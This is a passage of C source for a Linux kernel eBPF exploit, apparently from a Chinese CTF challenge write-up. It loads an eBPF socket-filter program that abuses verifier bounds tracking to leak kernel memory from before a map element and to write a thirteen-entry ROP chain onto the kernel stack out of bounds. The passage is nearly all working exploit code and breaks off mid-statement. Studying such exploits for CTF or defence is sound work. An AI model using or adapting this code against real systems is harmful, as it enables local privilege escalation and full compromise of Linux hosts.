    }
    static int bpf_lookup_elem(void *key, void *value, int mapfd) 
    {
        union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)key,
            .value = (__u64)value,
        };
        return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
    }
    static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
    {
        union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)&key,
            .value = (__u64)value,
            .info.bpf_fd = mapfd,
            .info.info_len = 0x50,
            .info.info = (__u64)info,
        };
        syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
        return *(uint32_t *)((char *)info+0x40);
    }
    static void __exit(char *err) 
    {
        fprintf(stderr, "error: %s\n", err);
        exit(-1);
    }
    static int load_my_prog()
    {
        struct bpf_insn my_prog[] = {
            BPF_LD_MAP_FD(BPF_REG_9,exp_mapfd),
            BPF_MAP_GET(0,BPF_REG_5),     
            BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8->&map
            BPF_MOV64_IMM(BPF_REG_0, 0x1),            
             BPF_LD_IMM64(BPF_REG_6, 0x8000000000000000),
            BPF_JMP_REG(BPF_JLE, BPF_REG_5, BPF_REG_6, 1), 
            BPF_EXIT_INSN(),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_5, BPF_REG_5), 
            BPF_MOV64_REG(BPF_REG_6, BPF_REG_5), 
            BPF_ALU64_IMM(BPF_RSH, BPF_REG_6, 33),    
            //--------------exp_mapfd
            BPF_MOV64_REG(BPF_REG_7, BPF_REG_8), 
            BPF_LDX_MEM(BPF_DW,BPF_REG_5,BPF_REG_8,0x8),  // r5 = op
            BPF_JMP_IMM(BPF_JNE, BPF_REG_5, 0, 5),    //3       
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x110), //r8 *= 0x110
            BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_6), // r7=r7-0x110
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7, 0),
            BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_0, 0x10), // leak *(&exp_elem[0]-0x110)
            BPF_EXIT_INSN(),
            BPF_MOV64_REG(BPF_REG_7,BPF_REG_10), // 对栈指针进行越界读写
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, -0x38),  // 开辟栈空间，-0x38 
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x20),  // r6 -> arb num， r6的值不能超过0x38，所以相加了两次进行溢出
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[0]
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), 
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 0x18),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_IMM(BPF_RSH,BPF_REG_6, 2),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[1]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 4*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[2]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 5*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[3]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 6*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[4]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 7*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[5]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 8*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[6]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 9*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[7]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 10*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[8]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 11*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[9]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 12*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[10]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 13*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[11]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 14*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_ALU64_REG(BPF_ADD,BPF_REG_7, BPF_REG_6), //rop[12]
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_8, 15*8),
            BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),
            BPF_MOV64_IMM(BPF_REG_0,0x0),
            BPF_EXIT_INSN(),
        };
        return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,my_prog,sizeof(my_prog),"GPL",0);
    }
    static void prep(void) 
    {
        exp_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
        if(exp_mapfd 
题目环境：